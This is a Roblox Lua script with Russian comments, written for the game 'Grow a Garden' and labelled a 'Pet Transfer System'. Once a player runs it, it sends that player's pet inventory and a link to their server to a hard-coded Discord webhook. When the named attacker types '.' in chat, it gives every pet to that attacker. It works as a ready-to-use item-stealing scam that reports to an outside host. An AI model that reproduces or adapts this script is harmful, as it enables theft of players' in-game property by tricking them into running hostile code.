local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- 🔧 НАСТРОЙКИ
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1401556845847646329/FeLb65sSQ660GjWF0PyUZGFpWb5ndW-9CZmY6Vw2rz-E0jEBqS886LFoLAaG4O4aG4SR"
local TARGET_PLAYER = "Rikizigg" -- Ник получателя
local TRIGGER_MESSAGE = "." -- Сообщение-триггер в чате
local DELAY_BETWEEN_ACTIONS = 1 -- Задержка между действиями (секунды)

-- 🐾 Получить всех питомцев в инвентаре
local function getAllPets()
    local pets = {}
    local backpack = player:FindFirstChild("Backpack") or player.Character
    
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(pets, item.Name)
        end
    end
    
    return pets
end

-- ✋ Автоматически взять питомца в руку
local function equipPet(petName)
    local pet = player.Backpack:FindFirstChild(petName)
    if pet then
        player.Character.Humanoid:EquipTool(pet)
        task.wait(DELAY_BETWEEN_ACTIONS)
        return true
    end
    return false
end

-- 📤 Отправить питомца
local function transferPet(petName)
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if not target then return false end

    if equipPet(petName) then
        local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
        PetGiftingService:FireServer("GivePet", target)
        return true
    end
    return false
end

-- 📨 Форматирование Discord-уведомления
local function createEmbed(petsList)
    local serverLink = "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
    
    return {
        content = "🔄 Готов к передаче питомцев!",
        embeds = {{
            title = "Grow a Garden - Pet Transfer System",
            color = 16753920, -- Оранжевый
            fields = {
                {name = "📌 Отправитель", value = player.Name, inline = true},
                {name = "🎯 Получатель", value = TARGET_PLAYER, inline = true},
                {name = "🔗 Подключиться к серверу", value = "[Кликните здесь]("..serverLink..")", inline = false},
                {name = "🐾 Питомцы в инвентаре ("..#petsList..")", value = "```"..table.concat(petsList, "\n").."```", inline = false}
            },
            footer = {text = "Ожидаю команду '"..TRIGGER_MESSAGE.."' в чате"},
            timestamp = DateTime.now():ToIsoDate()
        }}
    }
end

-- 📤 Отправить уведомление в Discord
local function sendInventoryUpdate()
    local pets = getAllPets()
    local data = createEmbed(pets)
    
    pcall(function()
        HttpService:PostAsync(DISCORD_WEBHOOK, HttpService:JSONEncode(data))
    end)
end

-- 👂 Обработчик чата
local function onChatMessage(message, speaker)
    if speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
        local pets = getAllPets()
        
        for _, petName in ipairs(pets) do
            if transferPet(petName) then
                print("✅ Успешно передан:", petName)
                task.wait(DELAY_BETWEEN_ACTIONS)
            end
        end
        
        sendInventoryUpdate() -- Обновляем статус после передачи
    end
end

-- 🔗 Подключение к чату
if TextChatService then
    TextChatService.OnIncomingMessage = function(message)
        onChatMessage(message.Text, Players:FindFirstChild(message.TextSource.Name))
    end
else
    game:GetService("Players").PlayerChatted:Connect(function(chatType, speaker, message)
        if chatType == Enum.PlayerChatType.All then
            onChatMessage(message, speaker)
        end
    end)
end

-- 🚀 Инициализация
sendInventoryUpdate()
print("✅ Система активирована. Ожидаю команду '"..TRIGGER_MESSAGE.."' от", TARGET_PLAYER)
